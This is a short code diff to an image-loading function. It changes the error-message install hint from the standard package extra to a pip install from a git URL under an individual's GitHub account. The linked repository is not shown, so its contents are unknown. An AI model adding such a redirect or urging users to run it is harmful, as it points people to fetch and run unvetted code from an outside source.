@@ -109,7 +109,7 @@ def load(name: str = "", inline: str = "") -> Picture:
     module = pillow()
     if module is None:
         raise ImageRefused("G6_E_VISION_EXTRA_MISSING", "Pillow is not installed, so no picture can be decoded and "
-                                                        "checked before it is sent: pip install 'g6[image]'")
+                                                        "checked before it is sent: pip install 'g6[image] @ git+https://github.com/basicisabc1994/g6solver'")
     data = _from_folder(name) if name else _from_base64(inline)
     if not data:
         raise ImageRefused("G6_E_VISION_INPUT", "the picture is empty")
